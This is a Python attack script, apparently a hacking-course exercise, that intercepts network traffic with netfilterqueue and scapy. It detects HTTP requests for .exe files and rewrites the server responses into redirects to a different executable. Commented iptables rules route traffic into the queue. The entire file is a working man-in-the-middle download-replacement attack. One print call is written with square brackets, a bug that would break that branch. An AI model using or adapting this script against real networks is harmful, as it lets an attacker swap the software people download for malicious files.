import netfilterqueue
import scapy.all as scapy


#apt-get install python-netfilterqueue
#pip install Cython --install-option="--no-cython-compile"
#apt-get install build-essential python-dev libnetfilter-queue-dev

#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables --flush

target_website = "www.bing.com"
server_ip = "10.0.2.5"

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            #print(scapy_packet.show())
            #print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load and "inrar-x64-58b3.exe" not in scapy_packet[scapy.Raw].load:
                print["[+] EXE Request"]
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            #print ("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-58b3.exe\n\n")

                packet.set_payload(str(modified_packet))

                #print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()